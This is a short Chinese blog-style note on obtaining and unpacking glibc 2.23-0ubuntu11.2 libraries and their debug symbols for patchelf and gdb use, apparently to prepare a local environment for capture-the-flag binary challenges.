这个版本的`glibc`在`glibc-all-in-one`是没有的，但很多情况的ubuntu16实际上是这个`glibc`而不是现在用的`glibc2.23-0ubuntu11.3`。因此以备需要，这个还是需要有一份的。

在[这里](https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu11.2)找到的。这里可以选择下amd64的和i386版本。

此外[这里](http://lliurex.net/xenial/pool/main/g/glibc/)也可以找到更多的版本。

进入对应的版本，我先是找到了对应的`deb`包（看着像的），然后直接解压，再解压，拿到一堆libs然后兴冲冲地拿去patchelf了

发现运行起来是没问题的，但是在`gdb`调试的时候会提示没有`debug symbol`。这个时候看了看`glibc-all-in-one`的`download`脚本

发现里面有下载对应的`debug symbol`文件 

因此还是在下`libs`包的地方把带`dbg`文件的也搞下来，并且要解压在对应`libs`文件夹的`.debug`文件夹中（默认隐藏看不到）就可以调试了。

好吧 结果最后发现`BUU`用的应该是`glibc2.23-0ubuntu11`
